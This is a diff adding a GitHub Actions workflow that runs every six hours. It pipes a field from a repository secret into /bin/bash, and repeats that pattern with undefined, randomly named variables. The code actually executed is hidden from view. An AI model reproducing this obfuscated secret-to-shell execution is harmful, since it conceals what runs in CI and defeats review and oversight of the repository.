@@ -1,0 +1,25 @@
+name: feiyulishou
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: feiyulishou
+        env:
+          zc300: ${{ secrets.zc300 }}
+        run: |
+          echo $zc300 | jq -r .lzmay09549 | /bin/bash
+          echo $iztda12 | jq -r .qr908 | /bin/bash
+          echo $zb7948 | jq -r .zb06044 | /bin/bash
+          echo $dw30588 | jq -r .mfgwx994 | /bin/bash
+          echo $acivm32 | jq -r .wmc9 | /bin/bash
+          echo $pno8 | jq -r .o6042 | /bin/bash
+          echo $ujolm72 | jq -r .nwl8 | /bin/bash
+
